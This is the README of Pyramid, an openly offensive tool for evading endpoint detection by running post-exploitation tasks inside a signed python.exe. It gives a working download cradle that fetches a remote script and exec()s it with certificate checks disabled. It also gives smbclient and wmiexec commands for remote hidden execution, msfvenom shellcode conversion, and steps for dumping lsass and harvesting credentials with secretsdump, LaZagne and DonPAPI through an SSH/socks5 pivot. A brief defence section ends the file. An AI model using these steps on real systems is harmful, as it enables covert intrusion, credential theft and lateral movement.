<p align="center">
<img width="399" alt="immagine" src="https://user-images.githubusercontent.com/59816245/184261793-b301440e-b006-4a6d-904f-90818ea86cfa.png">
</p>

# What is it

Pyramid is a set of Python scripts and module dependencies that can be used to evade EDRs. The main purpose of the tool is to perform offensive tasks by leveraging some Python evasion properties and looking as a legit Python application usage.
This can be achieved because:
1. the [Python Embeddable package](https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip) provides a signed Python interpreter with [good reputation](https://www.virustotal.com/gui/file/261f682238e2dc3296038c8bd78dd01e5874e1177ebe3da2afcba35ef82d73b7);
 2. Python has many legit applications, so there is a lot of different telemetry coming from the python.exe binary since the interpreter natively runs the APIs. This can be abused by operating within the Python.exe process and trying to blend in the huge "telemetry fingerprint" of python.exe binary.
 3. There is a lack of auditing for Python code execution - [PEP-578](https://peps.python.org/pep-0578/) tried to solve that but the stock python.exe binary does not have auditing capabilities enabled by default.
 4. Operations can be done natively from within python.exe natively using Python language to perform post exploitation tasks such as dynamically importing Python modules to run offensive tools and executing Beacon Object Files (after some BOF modifications) directly within python.exe.
 
For more information please check the **[DEFCON30 - Adversary village talk "Python vs Modern Defenses" slide deck](https://github.com/naksyn/talks/blob/main/DEFCON30/Diego%20Capriotti%20-%20DEFCON30%20Adversary%20Village%20-%20%20Python%20vs%20Modern%20Defenses.pdf)** and this **[post on my blog](https://www.naksyn.com/edr%20evasion/2022/09/01/operating-into-EDRs-blindspot.html)**. 

## Disclaimer

This tool was created to demostrate a bypass strategy against EDRs based on some blind-spots assumptions. It is a combination of already existing techniques and tools in a (to the best of my knowledge) novel way that can help evade defenses. The sole intent of the tool is to help the community increasing awareness around this kind of usage and accelerate a resolution. It' not a 0day, it's not a full fledged shiny C2, Pyramid exploits what might be EDRs blind spots and the tool has been made public to shed some light on them.
A defense paragraph has been included, hoping that experienced blue-teamers can help contribute and provide better possible resolution on the issue Pyramid aims to highlight. All information is provided for educational purposes only. Follow instructions at your own risk. Neither the author nor his employer are responsible for any direct or consequential damage or loss arising from any person or organization.


### Credits

Pyramid is using some awesome tools made by:

 - [xorrior](https://twitter.com/xorrior) for [Empyre - Finder Class](https://github.com/EmpireProject/EmPyre)

 - [TrustedSec](https://twitter.com/TrustedSec) for [COFFLoader](https://github.com/trustedsec/COFFLoader)

 - [Falconforcenl](https://twitter.com/falconforcenl) for [bof2shellcode](https://github.com/FalconForceTeam/BOF2shellcode)

 - [S4ntiagoP](https://twitter.com/s4ntiago_p) for [nanodump](https://github.com/helpsystems/nanodump)

  
### Contributors

[snovvcrash](https://twitter.com/snovvcrash) - base-DonPAPI.py - base-LaZagne.py - base-clr.py

### Current features

Pyramid capabilities are executed directly from python.exe process and are currently:

 1. Dynamic loading of BloodHound Python, impacket secretsdump, paramiko, DonPAPI, LaZagne, Pythonnet, pproxy.
 2. BOFs execution using in-process shellcode injection.
 3. In-process injection of a C2 agent and tunneling its traffic with local SSH port forwarding.

### Tool's description

Pyramid is meant to be used unpacking an official embeddable Python package and then running python.exe to execute a Python download cradle. This is a simple way to avoid creating uncommon Process tree pattern and looking like a normal Python application usage.
  

In Pyramid the download cradle is used to reach a Pyramid Server (simple HTTPS server with auth) to fetch base scripts and dependencies.

Base scripts are specific for the feature you want to use and contain:
 1. Custom Finder class to in-memory import required dependencies (zip files).
 2. Code to download the required dependencies.
 2. Main logic for the module you want to execute (bloodhound, secretsdump, paramiko etc.).

BOFs are ran through a base script containing the shellcode resulted from bof2shellcode and the related in-process injection code.

The Python dependencies have been already fixed and modified to be imported in memory without conflicting.

There are currently 4 main base scripts available:
 1. **base-bh.py** script will in-memory import and execute python-BloodHound.
 2. **base-secretsdump.py** script will in-memory import and execute [Impacket](https://github.com/SecureAuthCorp/impacket) secretsdump.
 3. **base-BOF-lsass.py** script is using a stripped version of nanodump to dump lsass from python.exe. This is achieved in-memory injecting shellcode output obtained from bof2shellcode and COFFloader. To make complex BOFs work with this technique, they should first be adapted for Python execution.
 4. **base-tunnel-inj.py** script import and executes paramiko on a new Thread to create an SSH local port forward to a remote SSH server. Afterward a shellcode can be locally injected in python.exe.
 5. **base-DonPAPI.py** script will in-memory import and execute [DonPAPI](https://github.com/login-securite/DonPAPI). Results and credentials extracted are saved on disk in the Python Embeddable Package Directory.
 6. **base-LaZagne.py** script will in-memory import and execute [LaZagne](https://github.com/AlessandroZ/LaZagne)
 7. **base-tunnel-socks5** script import and executes paramiko on a new Thread to create an SSH remote port forward to an SSH server, then a socks5 proxy server is executed locally on target and made accessible remotely through the SSH tunnel. 
### Usage


#### Starting the server


`git clone https://github.com/naksyn/Pyramid`

Generate SSL certificates for HTTP Server:

`openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365`

Example of running Pyramid HTTP Server using SSL certificate and by providing Basic Authentication:

`python3 PyramidHTTP.py 443 testuser Sup3rP4ss! /home/user/SSL/key.pem /home/user/SSL/cert.pem /home/user/Pyramid/Server/`


#### Modifying Base Scripts

##### base-bh.py

Insert AD details and HTTPS credentials in the upper part of the script.

##### base-secretsdump.py

Insert AD details and HTTPS credentials in the upper part of the script.

##### base-BOF-lsass.py

The nanodump BOF has been modified stripping Beacon API calls, cmd line parsing and hardcoding input arguments in order to use the process forking technique and outputting lsass dump to C:\Users\Public\video.avi. To change these settings modify nanodump source file **entry.c** accordingly and recompile the BOF.
Then use the tool bof2shellcode giving as input the compiled nanodump BOF:

`python3 bof2shellcode.py -i /home/user/bofs/nanodump.x64.o -o nanodump.x64.bin`

You can transform the resulting shellcode to python format using msfvenom:

`msfvenom -p generic/custom PAYLOADFILE=nanodump.x64.bin -f python > sc_nanodump.txt`

Then paste it into the base script within the shellcode variable.

##### base-tunnel-inj.py

Insert SSH server, local port forward details details and HTTPS credentials in the upper part of the script and modify the sc variable using your preferred shellcode stager. Remember to tunnel your traffic using SSH local port forward, so the stager should have 127.0.0.1 as C2 server and the SSH listening port as the C2 port.

##### base-DonPAPI.py

Insert AD details and HTTPS credentials in the upper part of the script.

##### base-LaZagne.py

Insert HTTPS credentials in the upper part of the script and change lazagne module if needed.

##### base-clr.py

Insert HTTPS credentials in the upper part of the script and assembly bytes of the file you want to load.

##### base-tunnel-socks5.py

Insert parameters in the upper part of the script.


#### Unzip embeddable package and execute the download cradle on target

Once the Pyramid server is running and the Base script is ready you can execute the download cradle from python.exe. A Python download cradle can be as simple as:

```python
import urllib.request
import base64
import ssl

gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
gcontext.check_hostname = False
gcontext.verify_mode = ssl.CERT_NONE
request = urllib.request.Request('https://myIP/base-bof.py')
base64string = base64.b64encode(bytes('%s:%s' % ('testuser', 'Sup3rP4ss!'),'ascii'))
request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
result = urllib.request.urlopen(request, context=gcontext)
payload = result.read()
exec(payload)
```

Bear in mind that urllib is an Embeddable Package native Python module, so you don't need to install additional dependencies for this cradle. 
The downloaded python "base" script will in-memory import the dependencies and execute its capabilites within the python.exe process.

#### Executing Pyramid without visible prompt

To execute Pyramid without bringing up a visible python.exe prompt you can leverage pythonw.exe that won't open a console window upon execution and is contained in the very same Windows Embeddable Package.
The following picture illustrate an example usage of pythonw.exe to execute base-tunnel-socks5.py on a remote machine without opening a python.exe console window.

![image](https://user-images.githubusercontent.com/59816245/195162985-2a14887f-5598-4829-8887-874d267d7f43.png)

The attack transcript is reported below:

Start Pyramid Server:

`python3 PyramidHTTP.py 443 testuser Sup3rP4ss! /home/nak/projects/dev/Proxy/Pyramid/key.pem /home/nak/projects/dev/Proxy/Pyramid/cert.pem /home/nak/projects/dev/Proxy/Pyramid/Server/`

Save the base download cradle to cradle.py.

Copy unpacked windows Embeddable Package (with cradle.py) to target:

`smbclient //192.168.1.11/C$ -U domain/user -c 'prompt OFF; recurse ON; lcd /home/user/Downloads/python-3.10.4-embed-amd64; cd Users\Public; mkdir python-3.10.4-embed-amd64; cd python-3.10.4-embed-amd64; mput *'`

Execute pythonw.exe to launch the cradle:

`/usr/share/doc/python3-impacket/examples/wmiexec.py domain/user:"Password1\!"@192.168.1.11 'C:\Users\Public\python-3.10.4-embed-amd64\pythonw.exe C:\Users\Public\python-3.10.4-embed-amd64\cradle.py'`

Socks5 server is running on target and SSH tunnel should be up, so modify proxychains.conf and tunnel traffic through target:

`proxychains impacket-secretsdump domain/user:"Password1\!"@192.168.1.50 -just-dc`



#### Limitations

Dynamically loading Python modules does not natively support importing *.pyd files that are essentially dlls. The only public solution to my knowledge that solves this problem is provided by Scythe *(in-memory-execution) by re-engineering the CPython interpreter. In ordrer not to lose the digital signature, one solution that would allow using the native Python embeddable package involves dropping on disk the required pyd files or wheels. This should not have significant OPSEC implications in most cases, however bear in mind that the following wheels containing pyd files are dropped on disk to allow Dinamic loading to complete:
 *. Cryptodome - needed by Bloodhound-Python, Impacket, DonPAPI and LaZagne
 *. bcrypt, cryptography, nacl, cffi - needed by paramiko

 - please note that running BOFs does not need dropping any pyd on disk since this techniques only involves shellcode injection.

### How to defend from this technique

Python.exe is a signed binary with good reputation and does not provide visibility on Python dynamic code. Pyramid exploits these evasion properties carrying out offensive tasks from within the same python.exe process.

For this reason, one of the most efficient solution would be to block by default binaries and dlls signed by Python Foundation, creating exceptions only for users that actually need to use python binaries.

Alerts on downloads of embeddable packages can also be raised.

Deploying PEP-578 is also feasible although complex, [this is a sample implementation](https://github.com/zooba/spython). However, deploying PEP-578 without blocking the usage of stock python binaries could make this countermeasure useless.
